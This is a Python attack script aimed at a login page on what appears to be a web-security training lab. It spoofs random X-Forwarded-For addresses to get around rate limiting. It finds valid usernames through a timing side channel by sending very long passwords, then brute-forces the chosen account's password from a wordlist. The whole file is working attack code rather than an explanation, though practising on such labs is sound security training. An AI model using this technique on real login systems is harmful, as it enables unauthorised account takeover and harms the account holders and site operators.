import requests
from random import randint

from bs4 import BeautifulSoup

# Set the URL and necessary headers
url = 'https://0a1d005603e4c0ce8083c1ec000100cd.web-security-academy.net/login'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
cookies = {'session': 'fCAEPZlKF2ZSqKWbbqRIQB3rpqUj6wVN'}


# Generate different IP addresses to simulate different users
def random_ip_generator():
    return "{}.{}.{}.{}".format(randint(0, 255), randint(0, 255), randint(0, 255), randint(0, 255))


with open("usernames.txt", "r") as f:
    usernames = f.read().splitlines()

found_username = 'apple'
max_time = 0
for username in usernames:
    ip = random_ip_generator()
    data = {'username': f'{username}',
            'password': '''nothinsdfsd325146549879+651as1df*--*/sadfhdfwgismorethan@$#W$R
                        #WDESWFS#$#@E621626262DFDSFDSFDcsefaatexTERER#$#$@SDtt65haty
                        oucr##$Rd;fgDFSFeatebymeansdf654a6s54diAS4fngfull64etters
                        6sd4fa6sd6f65s4we84tdt64h8d4fg8re7t96s6d54f6ewsd
                        sf45SD4FSE6486S5D4FeDS56E47F89S5D4SF6Sd6SF4E8564fse84f65sd4fe5
                        nothinsdfsd325146549879+651as1df*--*/sadfhdfwgismorethan@$#W$R
                        #WDESWFS#$#@E621626262DFDSFDSFDcsefaatexTERER#$#$@SDtt65haty
                        oucr##$Rd;fgDFSFeatebymeansdf654a6s54diAS4fngfull64etters
                        6sd4fa6sd6f65s4we84tdt64h8d4fg8re7t96s6d54f6ewsd
                        sf45SD4FSE6486S5D4FeDS56E47F89S5D4SF6Sd6SF4E8564fse84f65sd4fe5
                        nothinsdfsd325146549879+651as1df*--*/sadfhdfwgismorethan@$#W$R
                        #WDESWFS#$#@E621626262DFDSFDSFDcsefaatexTERER#$#$@SDtt65haty
                        oucr##$Rd;fgDFSFeatebymeansdf654a6s54diAS4fngfull64etters
                        6sd4fa6sd6f65s4we84tdt64h8d4fg8re7t96s6d54f6ewsd
                        sf45SD4FSE6486S5D4FeDS56E47F89S5D4SF6Sd6SF4E8564fse84f65sd4fe5
                        nothinsdfsd325146549879+651as1df*--*/sadfhdfwgismorethan@$#W$R
                        #WDESWFS#$#@E621626262DFDSFDSFDcsefaatexTERER#$#$@SDtt65haty
                        oucr##$Rd;fgDFSFeatebymeansdf654a6s54diAS4fngfull64etters
                        6sd4fa6sd6f65s4we84tdt64h8d4fg8re7t96s6d54f6ewsd
                        sf45SD4FSE6486S5D4FeDS56E47F89S5D4SF6Sd6SF4E8564fse84f65sd4fe5'''}

    # Set up the headers with the modified "X-Forwarded-for" header
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'X-Forwarded-For': ip
    }

    # Submit the login request with the given password and IP
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    time2 = response.elapsed.total_seconds()
    data = {'username': f'{username}', 'password': 'a'}
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    time1 = response.elapsed.total_seconds()
    if (time2 - time1) > max_time:
        max_time = time2 - time1
        found_username = username
    print(f"new time difference is {time2 - time1}")
    print(f"max time is {max_time} and belongs to {found_username}")

with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines()

found_password = None
for password in passwords:
    ip = random_ip_generator()
    data = {'username': f'{found_username}', 'password': password}

    # Set up the headers with the modified "X-Forwarded-for" header
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'X-Forwarded-For': ip
    }

    # Submit the login request with the given password and IP
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    html = BeautifulSoup(response.text, "html.parser")
    message = html.select(".is-warning")
    if len(message) > 0:
        print(f"password: {password} for username: {found_username} was incorrect!")
    else:
        print(f'password successfully found with username: {found_username} and password: {password}')
        found_password = password
        break
